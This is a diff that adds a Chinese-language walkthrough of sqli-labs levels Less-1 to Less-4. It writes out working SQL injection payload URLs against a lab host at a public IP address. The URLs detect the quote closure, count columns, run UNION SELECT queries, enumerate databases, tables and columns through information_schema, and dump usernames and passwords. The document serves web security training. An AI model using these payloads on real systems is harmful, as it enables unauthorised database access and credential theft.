@@ -1,0 +1,157 @@
+less-1
+
+1.找到注入点，发现报错回显。
+
+http://43.247.91.228:84/Less-1/?id=1'
+
+看到报错语句。
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1
+
+发现已经闭合，只要在后面加--+或者#注释掉后面的部分就可以了。
+
+2.猜字段数。
+
+
+http://43.247.91.228:84/Less-1/?id=1'order by 3--+
+
+
+3.使用联合查询。
+
+http://43.247.91.228:84/Less-1/?id=1'union select 1,2,3--+
+
+
+看一下源码，mysql_fetch_array只被调用了一次，
+
+而mysql_fetch_array从结果集中取得一行作为关联数组
+
+或数字数组或二者兼有，具体看第二个参数是什么。
+
+所以这里无论怎么折腾最后只会出来第一行的查询结果。
+
+只要让第一行查询的结果是空集0或-1，即union左边的select子句查询结果为空，
+
+那么union右边的查询结果自然就成为了第一行，打印在网页上了。
+
+
+4.注入查询基本信息
+
+
+http://43.247.91.228:84/Less-1/?id=1'union select 1,2,concat_ws(char(32,58,32),user(),database(),version())--+
+
+得到用户名root@localhost :数据库 security : 版本信息5.5.44-0ubuntu0.14.04.1
+
+这里可以看到是在security数据库里面了，但是我们也可以构造一条语句爆出所有的库。
+
+5.暴库
+
+首先说一下mysql的数据库information_schema，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，
+用户权限等信息，下面说一下常用的几个表
+
+
+SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。
+
+TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表
+
+COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是show columns from schemaname.tablename的结果取之此表。 
+
+
+
+
+http://43.247.91.228:84/Less-1/?id=-1'union select 1,group_concat(schema_name),3 from information_schema.schemata--+
+
+
+
+得到数据库
+
+information_schema,challenges,mysql,performance_schema,security
+
+
+6.爆库security的表
+
+http://43.247.91.228:84/Less-1/?id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
+
+ps：table_schema=后面可以直接加单引号括起的数据库名，也可以是数据库的16进制，过滤单引号可用。
+
+得到security数据库的所有表
+
+emails,referers,uagents,users
+
+7.爆users表的列
+
+http://43.247.91.228:84/Less-1/?id=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+
+
+得到列
+
+id,username,password
+
+8.爆数据
+
+http://43.247.91.228:84/Less-1/?id=-1'union select 1,username,password from users where id=2--+
+
+也可使用
+
+http://43.247.91.228:84/Less-1/?id=-1'union select 1,2,concat_ws(char(32,58,32),id,username,password) from users limit 2,1--+
+
+
+less-1 over！
+
+less-2
+
+测试注入点：
+
+http://43.247.91.228:84/Less-2/?id=1'
+
+发现报错语句。
+
+ You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1 
+
+发现原本已经闭合，加一个'反而多出来一个'，按照less-1的payload，把’去掉即可拿数据。
+
+less-2 over！
+
+less-3
+
+测试注入点：
+
+http://43.247.91.228:84/Less-3/?id=1'
+
+发现报错回显：
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
+
+后面多一个）导致语句无法闭合。
+
+重构造payload：
+
+
+http://43.247.91.228:84/Less-3/?id=1')
+
+报错回显：
+
+You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') LIMIT 0,1' at line 1
+
+语句已经闭合。按照less-1的payload，加一个)即可拿到数据。
+
+less-3 over！
+
+less-4
+
+测试注入点：
+
+http://43.247.91.228:84/Less-4/?id=1'
+
+发现并不报错，换"
+
+http://43.247.91.228:84/Less-4/?id=1"
+
+报错回显：
+
+ You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1 
+
+发现还要加一个）。按照less-1的payload，把'换成")即可拿到数据。
+
+
+
+
+
